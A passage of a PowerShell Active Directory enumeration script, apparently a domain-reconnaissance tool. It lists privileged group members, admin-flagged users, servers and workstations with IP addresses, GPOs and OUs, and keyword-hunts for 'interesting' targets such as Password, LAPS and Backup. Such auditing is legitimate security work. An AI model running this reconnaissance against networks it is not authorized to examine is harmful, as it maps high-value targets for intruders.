					if($ExtractedMember.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp}else{$lastLogon = ""}
					$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name" = $membername
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Member SID" = GetSID-FromBytes -sidBytes $RDPUser.objectsid
				"Group Domain" = $RDPUser.domain
			}
		}
	}

	if ($TempRDPUsers) {
		if(!$NoOutput){$TempRDPUsers | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLRDPUsers = $TempRDPUsers | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='RDPUsers'>Remote Desktop Users</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='RDPUsers'>" }
	}
	
	#################################################### 
	########### Remote Management Users ################
	####################################################
	
	Write-Host ""
	Write-Host "Remote Management Users" -ForegroundColor Cyan
	$TempRemManUsers = @()
	$TempRemManUsers = foreach ($AllDomain in $AllDomains) {
		$RemManUsers = @()
		$RemManUsers = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Remote Management Users"
		foreach($RemManUser in $RemManUsers){
			
			$isEnabled = if ($RemManUser.useraccountcontrol -band 2) { "False" } else { "True" }
			if($RemManUser.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $RemManUser.lastlogontimestamp}else{$lastLogon = ""}
			$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $RemManUser.samaccountname
			if(!$membername){
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq (GetSID-FromBytes -sidBytes $RemManUser.objectsid)}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if(!$isEnabled){$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }}
				if(!$isActive){
					if($ExtractedMember.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp}else{$lastLogon = ""}
					$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name" = $membername
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Member SID" = GetSID-FromBytes -sidBytes $RemManUser.objectsid
				"Group Domain" = $RemManUser.domain
			}
		}
	}

	if ($TempRemManUsers) {
		if(!$NoOutput){$TempRemManUsers | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLRemManUsers = $TempRemManUsers | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='RemManUsers'>Remote Management Users</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='RemManUsers'>" }
	}
	
	#################################################### 
	########### Schema Admins ################
	####################################################
	
	Write-Host ""
	Write-Host "Schema Admins" -ForegroundColor Cyan
	$TempSchemaAdmins = @()
	$TempSchemaAdmins = foreach ($AllDomain in $AllDomains) {
		$SchemaAdmins = @()
		$SchemaAdmins = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Schema Admins"
		foreach ($SchemaAdmin in $SchemaAdmins) {
			
			$isEnabled = if ($SchemaAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
			if ($SchemaAdmin.lastlogontimestamp) { $lastLogon = Convert-LdapTimestamp -timestamp $SchemaAdmin.lastlogontimestamp } else { $lastLogon = "" }
			$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $SchemaAdmin.samaccountname
			if (!$membername) {
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {
					$sid = $null;
					try {
						$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop
					} catch {}
					$sid -eq (GetSID-FromBytes -sidBytes $SchemaAdmin.objectsid)
				}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if (!$isEnabled) {
					$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }
				}
				if (!$isActive) {
					if ($ExtractedMember.lastlogontimestamp) {
						$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp
					} else {
						$lastLogon = ""
					}
					$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name"  = $membername
				"Enabled"      = $isEnabled
				"Active"       = $isActive
				"Last Logon"   = $lastLogon
				"Member SID"   = GetSID-FromBytes -sidBytes $SchemaAdmin.objectsid
				"Group Domain" = $SchemaAdmin.domain
			}
		}
	}

	if ($TempSchemaAdmins) {
		if(!$NoOutput){$TempSchemaAdmins | Sort-Object -Unique "Group Domain","Name","Member SID" | ft -Autosize -Wrap}
		$HTMLSchemaAdmins = $TempSchemaAdmins | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='SchemaAdmins'>Schema Admins</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='SchemaAdmins'>" }
	}
	
	#################################################### 
	########### Server Operators ################
	####################################################
	
	Write-Host ""
	Write-Host "Server Operators" -ForegroundColor Cyan
	$TempServerOperators = @()
	$TempServerOperators = foreach ($AllDomain in $AllDomains) {
		$ServerOperators = @()
		$ServerOperators = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Server Operators"
		foreach ($ServerOperator in $ServerOperators) {
			
			$isEnabled = if ($ServerOperator.useraccountcontrol -band 2) { "False" } else { "True" }
			if ($ServerOperator.lastlogontimestamp) { $lastLogon = Convert-LdapTimestamp -timestamp $ServerOperator.lastlogontimestamp } else { $lastLogon = "" }
			$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $ServerOperator.samaccountname
			if (!$membername) {
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {
					$sid = $null
					try {
						$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop
					} catch {}
					$sid -eq (GetSID-FromBytes -sidBytes $ServerOperator.objectsid)
				}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if (!$isEnabled) {
					$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }
				}
				if (!$isActive) {
					if ($ExtractedMember.lastlogontimestamp) { $lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp } else { $lastLogon = "" }
					$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name" = $membername
				"Enabled"     = $isEnabled
				"Active"      = $isActive
				"Last Logon"  = $lastLogon
				"Member SID"  = GetSID-FromBytes -sidBytes $ServerOperator.objectsid
				"Group Domain"= $ServerOperator.domain
			}
		}
	}

	if ($TempServerOperators) {
		if(!$NoOutput){$TempServerOperators | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLServerOperators = $TempServerOperators | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='ServerOperators'>Server Operators</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='ServerOperators'>" }
	}

	
	
	#####################################################
    ############### Interesting Data ###################
    #####################################################
	
	if($AllEnum){
		$InterestingDataBanner = "<h3>Interesting Data</h3>"
		Write-Host ""
		Write-Host "Interesting Data" -ForegroundColor Red
		Write-Host ""
		$Keywords = @("Admin", "Azure", "Backup", "CCTV", "Cyber", "Desk", "Director", "File", "Finance", "FS", "Hyper", "JEA", "LAPS", "LLMNR", "Management", "MECM", "Mgmt", "Password", "PAM", "PAW", "PPL", "PSM", "PXE", "RDP", "Remote", "Remoting", "SCCM", "Security", "SQL", "VEEAM", "VMWare")

		############################################################
		########### Servers (by Keyword) ###############
		############################################################

		Write-Host ""
		Write-Host "Interesting Servers (by Keyword)" -ForegroundColor Cyan
		$TempInterestingServersEnabled = foreach ($AllDomain in $AllDomains) {
			$InterestingServers = @()
			foreach($Keyword in $Keywords){$InterestingServers += $TotalEnabledMachines | Where-Object { $_.domain -eq $AllDomain -AND $_.operatingsystem -like "*Server*" -AND $_.samaccountname -like "*$Keyword*" }}
			foreach ($InterestingServer in $InterestingServers) {
				if($InterestingServer.DnsHostName){$IPAddress = (Resolve-DnsName -Name $InterestingServer.DnsHostName -Type A).IPAddress}
				if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
				[PSCustomObject]@{
					"Name" = $InterestingServer.samaccountname
					"Enabled" = if ($InterestingServer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if(!$InterestingServer.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $InterestingServer.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = $IPAddress
					"Operating System" = $InterestingServer.operatingsystem
					"Account SID" = GetSID-FromBytes -sidBytes $InterestingServer.objectsid
					"Domain" = $AllDomain
					#Description = $InterestingServer.description
				}
				$IPAddress = $null
			}
		}

		if ($TempInterestingServersEnabled) {
			if(!$NoOutput){$TempInterestingServersEnabled | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap}
			$HTMLInterestingServersEnabled = $TempInterestingServersEnabled | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='InterestingServersEnabled'>Interesting Servers (by Keyword)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='InterestingServersEnabled'>" }
		}

		#######################################
		########### GPOs by Keyword ################
		#######################################
			
		Write-Host ""
		Write-Host "Interesting GPOs (by Keyword)" -ForegroundColor Cyan
		$TempKeywordDomainGPOs = foreach ($AllDomain in $AllDomains) {
			$GetAllGPOsFirst = @($AllCollectedGPOs | Where-Object { $_.domain -eq $AllDomain })
			foreach($Keyword in $Keywords){
				$KeywordDomainGPOs = $GetAllGPOsFirst | Where-Object { $_.DisplayName -like "*$Keyword*" }
				foreach ($DomainGPO in $KeywordDomainGPOs) {
					[PSCustomObject]@{
						Keyword = $Keyword
						"GPO Name" = $DomainGPO.DisplayName
						"Path" = $DomainGPO.gpcfilesyspath
						Domain = $AllDomain
					}
				}
			}
		}

		if ($TempKeywordDomainGPOs) {
			if(!$NoOutput){$TempKeywordDomainGPOs | Sort-Object Domain,Keyword,"GPO Name" | Format-Table -AutoSize -Wrap}
			$HTMLKeywordDomainGPOs = $TempKeywordDomainGPOs | Sort-Object Domain,Keyword,"GPO Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='KeywordDomainGPOs'>Interesting GPOs (by Keyword)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='KeywordDomainGPOs'>" }
		}
		
		#########################################
		########### Groups by keyword ###########
		#########################################
		
		Write-Host ""
		Write-Host "Interesting Groups (by Keyword)" -ForegroundColor Cyan
		$TempGroupsByKeyword = foreach ($AllDomain in $AllDomains) {
			$findallgroupsfirst = @($TotalGroups | Where-Object { $_.domain -eq $AllDomain })
			foreach ($Keyword in $Keywords) {
				$filteredGroups = $findallgroupsfirst | Where-Object { $_.SamAccountName -like "*$Keyword*" }
				foreach ($Group in $filteredGroups) {
					[PSCustomObject]@{
						"Keyword" = $Keyword
						"Group Name" = $Group.SamAccountName
						"Group SID" = GetSID-FromBytes -sidBytes $Group.ObjectSID
						"Domain" = $AllDomain
					}
				}
			}
		}

		if ($TempGroupsByKeyword) {
			if(!$NoOutput){$TempGroupsByKeyword | Sort-Object Domain,Keyword,"Group Name" | Format-Table -AutoSize -Wrap}
			$HTMLGroupsByKeyword = $TempGroupsByKeyword | Sort-Object Domain,Keyword,"Group Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='GroupsByKeyword'>Interesting Groups (by Keyword)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='GroupsByKeyword'>" }
		}
		
		#############################################
		########### Domain OUs by Keyword ###########
		#############################################
		
		Write-Host ""
		Write-Host "Interesting OUs (by Keyword)" -ForegroundColor Cyan

		$TempDomainOUsByKeyword = foreach($AllDomain in $AllDomains){
			$GetAllOUsFirst = @($AllCollectedOUs | Where-Object {$_.domain -eq $AllDomain})
			foreach ($Keyword in $Keywords) {
				$GetFilteredOUs = $GetAllOUsFirst | Where-Object {$_.name -like "*$Keyword*"}
				foreach ($ou in $GetFilteredOUs) {

					[PSCustomObject]@{
						"Keyword" = $Keyword
						Name = $ou.Name
						Domain = $AllDomain
					}
				}
			}
		}

		if($TempDomainOUsByKeyword) {
			if(!$NoOutput){$TempDomainOUsByKeyword | Sort-Object Domain,Keyword,Name | Format-Table -AutoSize -Wrap}
			$HTMLDomainOUsByKeyword = $TempDomainOUsByKeyword | Sort-Object Domain,Keyword,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='DomainOUsByKeyword'>Interesting OUs (by Keyword)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='DomainOUsByKeyword'>" }
		}
	}
	
	if(!$NoServers -OR $Workstations -OR $AllEnum -OR $DomainUsers -OR $AllGroups -OR $AllGPOs -OR $DomainOUs -OR $AllDescriptions){
		################################################
		######### Domain Object Insights ###############
		################################################
		
		$DomainObjectsInsightsBanner = "<h3>Domain Objects Insights</h3>"
		Write-Host ""
		Write-Host "Domain Objects Insights" -ForegroundColor Red
		Write-Host ""
	}
	
	############################################
    ########### Servers (Enabled)###############
	############################################
	
    if($NoServers){}
    else{
        Write-Host ""
		Write-Host "Servers (Enabled)" -ForegroundColor Cyan
		$TempServersEnabled = foreach ($AllDomain in $AllDomains) {
			$ComputerServers = @($TotalEnabledServers | Where-Object {$_.domain -eq $AllDomain})
			foreach ($ComputerServer in $ComputerServers) {
				if($ComputerServer.DnsHostName){$IPAddress = (Resolve-DnsName -Name $ComputerServer.DnsHostName -Type A).IPAddress}
				if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
				[PSCustomObject]@{
					"Name" = $ComputerServer.samaccountname
					"Enabled" = if ($ComputerServer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if(!$ComputerServer.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $ComputerServer.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = $IPAddress
					"Operating System" = $ComputerServer.operatingsystem
					"Account SID" = GetSID-FromBytes -sidBytes $ComputerServer.objectsid
					"Domain" = $AllDomain
				}
				$IPAddress = $null
			}
		}

  		if ($TempServersEnabled) {
			if(!$NoOutput){$TempServersEnabled | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap}
			$HTMLServersEnabled = $TempServersEnabled | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='ServersEnabled'>Servers (Enabled)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='ServersEnabled'>" }
		}
    }
	
	<# #############################################
    ########### Servers (Disabled)###############
	#############################################
	
    if($NoServers){}
    else{
        Write-Host ""
		Write-Host "Servers (Disabled)" -ForegroundColor Cyan
		$TempServersDisabled = foreach ($AllDomain in $AllDomains) {
			$ComputerServers = @($TotalDisabledServers | Where-Object {$_.domain -eq $AllDomain})
			foreach ($ComputerServer in $ComputerServers) {
				$IPAddress = (Resolve-DnsName -Name $ComputerServer.DnsHostName -Type A).IPAddress
				if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
				[PSCustomObject]@{
					"Name" = $ComputerServer.samaccountname
					"Enabled" = if ($ComputerServer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if(!$ComputerServer.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $ComputerServer.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = $IPAddress
					"Operating System" = $ComputerServer.operatingsystem
					"Account SID" = GetSID-FromBytes -sidBytes $ComputerServer.objectsid
					"Domain" = $AllDomain
				}
				$IPAddress = $null
			}
		}

    	if ($TempServersDisabled) {
			if(!$NoOutput){$TempServersDisabled | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap}
			$HTMLServersDisabled = $TempServersDisabled | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='ServersDisabled'>Servers (Disabled)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='ServersDisabled'>" }
		}
    } #>
	
	##################################################
    ########### Workstations (Enabled) ###############
	##################################################
	
	if($Workstations -OR $AllEnum){
        Write-Host ""
		Write-Host "Workstations (Enabled)" -ForegroundColor Cyan
		$TempWorkstationsEnabled = foreach ($AllDomain in $AllDomains) {
			$AllWorkstations = @($TotalEnabledWorkstations | Where-Object {$_.domain -eq $AllDomain})
			foreach ($Workstation in $AllWorkstations) {
				if($Workstation.DnsHostName){$IPAddress = (Resolve-DnsName -Name $Workstation.DnsHostName -Type A).IPAddress}
				if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
				[PSCustomObject]@{
					"Name" = $Workstation.samaccountname
					"Enabled" = if ($Workstation.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if(!$Workstation.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $Workstation.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = $IPAddress
					"Operating System" = $Workstation.operatingsystem
					"Account SID" = GetSID-FromBytes -sidBytes $Workstation.objectsid
					"Domain" = $AllDomain
				}
				$IPAddress = $null
			}
		}

  		if ($TempWorkstationsEnabled) {
			if(!$NoOutput){$TempWorkstationsEnabled | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap}
			$HTMLWorkstationsEnabled = $TempWorkstationsEnabled | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='WorkstationsEnabled'>Workstations (Enabled)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='WorkstationsEnabled'>" }
		}

	}
	
	<# ###################################################
    ########### Workstations (Disabled) ###############
	###################################################
	
	if($Workstations -OR $AllEnum){
        Write-Host ""
		Write-Host "Workstations (Disabled)" -ForegroundColor Cyan
		$TempWorkstationsDisabled = foreach ($AllDomain in $AllDomains) {
			$AllWorkstations = @($TotalDisabledWorkstations | Where-Object {$_.domain -eq $AllDomain})
			foreach ($Workstation in $AllWorkstations) {
				$IPAddress = (Resolve-DnsName -Name $Workstation.DnsHostName -Type A).IPAddress
				if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
				[PSCustomObject]@{
					"Name" = $Workstation.samaccountname
					"Enabled" = if ($Workstation.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if(!$Workstation.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $Workstation.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = $IPAddress
					"Operating System" = $Workstation.operatingsystem
					"Account SID" = GetSID-FromBytes -sidBytes $Workstation.objectsid
					"Domain" = $AllDomain
				}
				$IPAddress = $null
			}
		}

    	if ($TempWorkstationsDisabled) {
			if(!$NoOutput){$TempWorkstationsDisabled | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap}
			$HTMLWorkstationsDisabled = $TempWorkstationsDisabled | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='WorkstationsDisabled'>Workstations (Disabled)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='WorkstationsDisabled'>" }
		}
    } #>

	#####################################
    ########### Enabled Users ###########
	#####################################
	
	if ($DomainUsers -OR $AllEnum){
		Write-Host ""
		Write-Host "Users (Enabled)" -ForegroundColor Cyan
		
		$TempEnabledUsers = foreach ($AllDomain in $AllDomains) {
			$EnabledUsers = @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain})
			foreach ($EnabledUser in $EnabledUsers) {
				[PSCustomObject]@{
					"User Name" = $EnabledUser.samaccountname
					"Enabled" = if ($EnabledUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if(!$EnabledUser.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $EnabledUser.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
					"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $EnabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $EnabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $EnabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"Object SID" = GetSID-FromBytes -sidBytes $EnabledUser.objectsid
					"Domain" = $AllDomain
				}
			}
		}

  		if ($TempEnabledUsers) {
			if(!$NoOutput){$TempEnabledUsers | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap}
			$HTMLEnabledUsers = $TempEnabledUsers | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='EnabledUsers'>Users (Enabled)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='EnabledUsers'>" }
		}
	}

	
	<# ######################################
    ########### Disabled Users ###########
	######################################
	
	if ($DomainUsers -OR $AllEnum){
		Write-Host ""
		Write-Host "Users (Disabled)" -ForegroundColor Cyan
		
		$TempDisabledUsers = foreach ($AllDomain in $AllDomains) {
			$DisabledUsers = @($TotalDisabledUsers | Where-Object {$_.domain -eq $AllDomain})
			foreach ($DisabledUser in $DisabledUsers) {
				[PSCustomObject]@{
					"User Name" = $DisabledUser.samaccountname
					"Enabled" = if ($DisabledUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if(!$DisabledUser.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $DisabledUser.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
					"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $DisabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $DisabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $DisabledUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"Object SID" = GetSID-FromBytes -sidBytes $DisabledUser.objectsid
					"Domain" = $AllDomain
				}
			}
		}

  		if ($TempDisabledUsers | Where-Object {$_."User Name" -ne "krbtgt"}) {
			if(!$NoOutput){$TempDisabledUsers | Where-Object {$_."User Name" -ne "krbtgt"} | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap}
			$HTMLDisabledUsers = $TempDisabledUsers | Where-Object {$_."User Name" -ne "krbtgt"} | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='DisabledUsers'>Users (Disabled)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='DisabledUsers'>" }
		}
	} #>

 	##################################
    ########### All Groups ###########
	##################################
	
	if($AllGroups -OR $AllEnum){
		Write-Host ""
		Write-Host "All Groups" -ForegroundColor Cyan
		$TempOtherGroups = foreach ($AllDomain in $AllDomains) {
			$OtherGroups = @($TotalGroups | Where-Object {$_.domain -eq $AllDomain})
			foreach ($OtherGroup in $OtherGroups) {
				
				if($Force){
					$OtherGroupMembers = @(RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity $OtherGroup.samaccountname)
					$FinalGroupMembers = @()
					$FinalGroupMembers = foreach ($OtherGroupMember in $OtherGroupMembers) {
						$membername = $OtherGroupMember.samaccountname
						if($membername){$membername}
						else{
							$ExtractedMember = @()
							$ExtractedMember = $SumGroupsUsers | Where-Object {
								$sid = $null
								try {
									$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop
								} catch {}
								$sid -eq (GetSID-FromBytes -sidBytes $OtherGroupMember.objectsid)
							}
							if($ExtractedMember){
								$tempmembername = $ExtractedMember.samaccountname
								$memberdomain = $ExtractedMember.domain
								$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
								$membername
							}
							else{continue}
						}
					}
					
					[PSCustomObject]@{
						"Group Name" = $OtherGroup.SamAccountName
						"Group SID" = GetSID-FromBytes -sidBytes $OtherGroup.objectsid
						"Domain" = $AllDomain
						"Members" = ($FinalGroupMembers | Sort-Object -Unique) -join ' - '
					}
				}
				
				else{
					[PSCustomObject]@{
						"Group Name" = $OtherGroup.SamAccountName
						"Group SID" = GetSID-FromBytes -sidBytes $OtherGroup.objectsid
						"Domain" = $AllDomain
					}
				}
			}
		}

  		if ($TempOtherGroups | Where-Object {$_."Group Name"}) {
			if(!$NoOutput){$TempOtherGroups | Where-Object {$_."Group Name"} | Sort-Object Domain,"Group Name" | Format-Table -AutoSize -Wrap}
			$HTMLOtherGroups = $TempOtherGroups | Where-Object {$_."Group Name"} | Sort-Object Domain,"Group Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='OtherGroups'>All Groups</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='OtherGroups'>" }
		}
	}

 	###########################################
    ########### All Domain GPOs ###############
	###########################################
	
	if($AllGPOs -OR $AllEnum){
        Write-Host ""
		Write-Host "All Domain GPOs" -ForegroundColor Cyan
		$TempDomainGPOs = foreach ($AllDomain in $AllDomains) {
			$DomainGPOs = @($AllCollectedGPOs | Where-Object { $_.domain -eq $AllDomain })
			foreach ($DomainGPO in $DomainGPOs) {
				$GPOGuid = ($DomainGPO.gpcfilesyspath -split "}")[-2].split("{")[-1]  # Extracting the GPO's GUID
				$TargetOUs = @($AllCollectedOUs | Where-Object { $_.domain -eq $AllDomain -AND $_.gplink -like "*$GPOGuid*"} )
				$OUs = $TargetOUs.name -Join " - "
				[PSCustomObject]@{
					"GPO Name" = $DomainGPO.DisplayName
					"Path" = $DomainGPO.gpcfilesyspath
					"OUs the policy applies to" = $OUs
					Domain = $AllDomain
				}
			}
		}

  		if ($TempDomainGPOs) {
			if(!$NoOutput){$TempDomainGPOs | Sort-Object Domain,"GPO Name" | Format-Table -AutoSize -Wrap}
			$HTMLDomainGPOs = $TempDomainGPOs | Sort-Object Domain,"GPO Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='DomainGPOs'>All Domain GPOs</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='DomainGPOs'>" }
		}
	}
	
	######################################
    ########### Domain OUs ###########
	######################################
	
	if($DomainOUs -OR $AllEnum){
		Write-Host ""
		Write-Host "All Domain OUs" -ForegroundColor Cyan
		$TempAllDomainOUs = @()
		$TempAllDomainOUs = foreach($AllDomain in $AllDomains){
			$CollectOUs = @($AllCollectedOUs | Where-Object { $_.domain -eq $AllDomain })
			foreach ($ou in $CollectOUs) {
				
				$ouDN = $ou.distinguishedName
				
				# Filter users within this OU
				$users = ($TotalEnabledUsers | Where-Object { $_.domain -eq $AllDomain -AND $_.distinguishedName -like "*,${ouDN}" } | ForEach-Object { $_.samaccountname })

				# Filter computers within this OU
				$computers = @($TotalEnabledMachines | Where-Object { $_.domain -eq $AllDomain -AND $_.distinguishedName -like "*,${ouDN}" } | ForEach-Object { $_.samaccountname })

				# Filter groups within this OU
				$collgroups = @($TotalGroups | Where-Object { $_.domain -eq $AllDomain -AND $_.distinguishedName -like "*,${ouDN}" } | ForEach-Object { $_.samaccountname + "(Grp)" })

    				# Filter orgunits within this OU
    				$orgunits = @($AllCollectedOUs | Where-Object { $_.domain -eq $AllDomain -AND $_.distinguishedName -like "*,${ouDN}" } | ForEach-Object { $_.name + "(OU)" })

 				# Filter orgunits within this OU
    				$collforeign = @($AllForeignSecurityPrincipals | Where-Object { $_.domain -eq $AllDomain -AND $_.distinguishedName -like "*,${ouDN}" } | ForEach-Object { $_.name + "(Foreign)" })
    
    				# Combine users and computers
				$members = @($users + $computers + $collgroups + $orgunits + $collforeign) -join ' - '

				# Create a custom object for each OU with its members
				[PSCustomObject]@{
					Name    = $ou.name
					Domain  = $ou.domain
					Members = $members
				}
			}
		}

  		if($TempAllDomainOUs) {
			if(!$NoOutput){$TempAllDomainOUs | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap}
			$HTMLAllDomainOUs = $TempAllDomainOUs | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='AllDomainOUs'>All Domain OUs</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='AllDomainOUs'>" }
		}
	}

 	####################################################
